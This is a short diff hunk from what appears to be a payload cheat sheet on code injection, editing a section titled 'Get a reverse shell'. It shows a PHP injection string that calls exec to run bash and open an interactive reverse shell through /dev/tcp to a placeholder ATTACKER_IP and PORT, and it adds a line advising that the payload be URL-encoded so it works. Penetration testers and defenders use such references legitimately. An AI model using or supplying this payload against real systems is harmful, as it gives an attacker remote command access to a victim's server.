@@ -19,3 +19,5 @@ Read files from the machine
 Get a reverse shell
 
     ' and die(exec('bash -c "/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')) or '
+
+## You might need to URL encode the payload for it to work (encode special characters too!)
